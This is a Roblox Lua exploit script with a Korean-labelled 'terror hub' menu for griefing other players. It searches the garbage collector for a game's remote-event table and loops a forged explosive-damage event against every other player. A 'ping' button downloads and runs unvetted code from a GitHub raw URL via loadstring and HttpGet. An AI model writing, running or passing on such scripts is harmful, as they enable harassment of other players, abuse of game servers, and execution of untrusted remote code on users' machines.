local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ScreenGui 생성
local gui = Instance.new("ScreenGui")
gui.Name = "콘솔X 망겜테러 허브"
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- MainFrame (허브 UI 전체)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 200)  -- 크기 조정
mainFrame.Position = UDim2.new(0.5, -150, 0.4, -100)  -- 위치 조정
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = gui

-- TitleBar (드래그 가능 영역)
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

-- UI 내용 (텍스트)
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, -30)
textLabel.Position = UDim2.new(0, 0, 0, 30)
textLabel.Text = "콘솔X 사이다부대&골프부대 테러 허브"  -- 설명 텍스트 변경
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 18
textLabel.BackgroundTransparency = 1
textLabel.Parent = mainFrame

-- 버튼 생성 함수
local function createButton(text, position, callback)
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.4, 0, 0, 40)
button.Position = position
button.Text = text
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 16
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = button

button.MouseButton1Click:Connect(callback)

return button

end

-- 킬올 버튼 상태 추적
local isKilling = false

-- 킬올 실행 함수
local function killAll()
if isKilling then
return  -- 이미 실행 중이면 함수 종료
end

isKilling = true  -- 올킬 시작
local CE_Events
local ReplicatedStorage = game:GetService("ReplicatedStorage")
for i, v in next, getgc(true) do
if type(v) == 'table' and rawget(v, 'damageEvent') and rawget(v, 'equipEvent') then
CE_Events = v
end
end

if CE_Events then
while isKilling do  -- isKilling이 true일 동안 무한 실행
for _, plr in pairs(Players:GetPlayers()) do
if plr ~= player then
CE_Events["explosiveEvent"]:FireServer(nil, plr.Character:GetPivot().Position, 50000, 1213320, 1321330, nil, nil, nil, nil, nil, nil, nil, "Auth")
end
end
wait(0.1)  -- 잠시 대기 후 반복
end
end

end

-- 버튼들
local ciderPingButton = createButton("핑", UDim2.new(0.05, 0, 0.2, 0), function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Dain29292929/Ce1/refs/heads/main/Ce1"))()
end)

local bottomRightButton = createButton("ce연속킬올", UDim2.new(0.55, 0, 0.6, 0), function()
if isKilling then
isKilling = false  -- 이미 실행 중이면 멈추기
else
killAll()  -- 실행되지 않으면 실행
end
end)

-- 허브 보이기/숨기기 버튼
local settingsButton = Instance.new("TextButton")
settingsButton.Size = UDim2.new(0, 50, 0, 50)
settingsButton.Position = UDim2.new(0, 10, 0.5, -25)
settingsButton.Text = "⚙️"
settingsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
settingsButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
settingsButton.Parent = gui

mainFrame.Visible = false
settingsButton.MouseButton1Click:Connect(function()
mainFrame.Visible = not mainFrame.Visible
end)

-- 🛠️ 드래그 기능
local UserInputService = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

titleBar.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
dragging = true
dragStart = input.Position
startPos = mainFrame.Position

input.Changed:Connect(function()
if input.UserInputState == Enum.UserInputState.End then
dragging = false
end
end)
end

end)

titleBar.InputChanged:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
dragInput = input
end
end)

UserInputService.InputChanged:Connect(function(input)
if dragging and input == dragInput then
local delta = input.Position - dragStart
local newX = startPos.X.Offset + delta.X
local newY = startPos.Y.Offset + delta.Y

mainFrame.Position = UDim2.new(startPos.X.Scale, newX, startPos.Y.Scale, newY)
end
end)
